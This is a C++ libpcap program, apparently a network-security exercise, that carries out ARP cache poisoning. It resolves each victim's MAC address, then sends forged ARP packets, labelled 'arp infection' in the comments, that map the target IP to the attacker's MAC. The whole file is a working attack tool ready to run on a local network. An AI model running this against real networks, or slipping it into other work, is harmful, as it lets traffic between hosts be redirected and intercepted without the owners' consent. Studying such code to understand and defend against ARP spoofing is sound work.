#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stdint.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;

    EthArpPacket() : eth_(), arp_() {}
    EthArpPacket(const EthHdr& eth, const ArpHdr& arp) : eth_(eth), arp_(arp) {}
};
#pragma pack(pop)

Mac attacker_mac;
Mac sender_mac;

void usage() {
    printf("syntax: send-arp  <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0\n");
}

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct EthHdr *eth_header = (struct EthHdr *) packet;

    if (eth_header->dmac() == attacker_mac && (eth_header->type() == EthHdr::Arp)) {
        struct ArpHdr *arp_header = (struct ArpHdr *) (packet + sizeof(struct EthHdr));

        if (arp_header->op() == 2) {
            sender_mac = arp_header->smac();
            pcap_breakloop((pcap_t *)args);
         }
    }
}

void create_eth_hdr(EthHdr* eth_hdr, Mac *dmac, Mac *smac, uint16_t type) {
    eth_hdr->dmac_ = *dmac;
    eth_hdr->smac_ = *smac;
    eth_hdr->type_ = htons(type);
}

void create_arp_hdr(ArpHdr* arp_hdr, Mac *smac, Mac *tmac, Ip *sip, Ip *tip) {
    arp_hdr->hrd_ = htons(ArpHdr::ETHER);
    arp_hdr->pro_ = htons(EthHdr::Ip4);
    arp_hdr->hln_ = Mac::SIZE;
    arp_hdr->pln_ = Ip::SIZE;
    arp_hdr->op_ = htons(ArpHdr::Request);
    arp_hdr->smac_ = *smac;
    arp_hdr->tmac_ = *tmac;
    arp_hdr->sip_ = htonl(*sip);
    arp_hdr->tip_ = htonl(*tip);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // create a socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;

    // get attacker's mac addr
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    attacker_mac = Mac(reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data));

    // get attacker's ip addr
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    Ip attacker_ip = Ip(ntohl(ipaddr->sin_addr.s_addr));

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip(argv[i]);
        Ip target_ip(argv[i + 1]);

        Mac broadcast_mac("ff:ff:ff:ff:ff:ff");
        Mac unknown_mac("00:00:00:00:00:00");

        // create a packet for get a sender's mac addr
        EthHdr eth_hdr_for_sender_mac;
        create_eth_hdr(&eth_hdr_for_sender_mac, &broadcast_mac, &attacker_mac, EthHdr::Arp);

        ArpHdr arp_hdr_for_sender_mac;
        create_arp_hdr(&arp_hdr_for_sender_mac, &attacker_mac, &unknown_mac, &attacker_ip, &sender_ip);

        EthArpPacket packet_for_sender_mac(eth_hdr_for_sender_mac, arp_hdr_for_sender_mac);

        // send a packet
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_for_sender_mac), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        // parsing sender's mac addr in arp reply packet
        pcap_loop(handle, 10, packet_handler, reinterpret_cast<u_char *>(handle));

        // create a packet for arp infection
        EthHdr eth_hdr_for_attack;
        create_eth_hdr(&eth_hdr_for_attack, &sender_mac, &attacker_mac, EthHdr::Arp);

        ArpHdr arp_hdr_for_attack;
        create_arp_hdr(&arp_hdr_for_attack, &attacker_mac, &sender_mac, &target_ip, &sender_ip);

        EthArpPacket infection_packet(eth_hdr_for_attack, arp_hdr_for_attack);

        // send an arp infection packet
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);
}
